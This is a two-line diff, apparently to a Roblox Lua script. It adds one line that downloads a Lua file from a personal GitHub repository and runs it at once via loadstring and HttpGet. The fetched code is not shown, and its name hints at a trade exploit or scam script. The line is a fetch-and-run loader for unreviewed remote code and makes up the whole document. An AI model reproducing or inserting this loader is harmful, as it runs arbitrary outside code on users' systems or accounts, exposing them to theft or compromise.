@@ -1,1 +1,2 @@
--
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xyaxzj/sigmamaboi.lua/refs/heads/main/sigmaboitradee.lua"))()
+ 
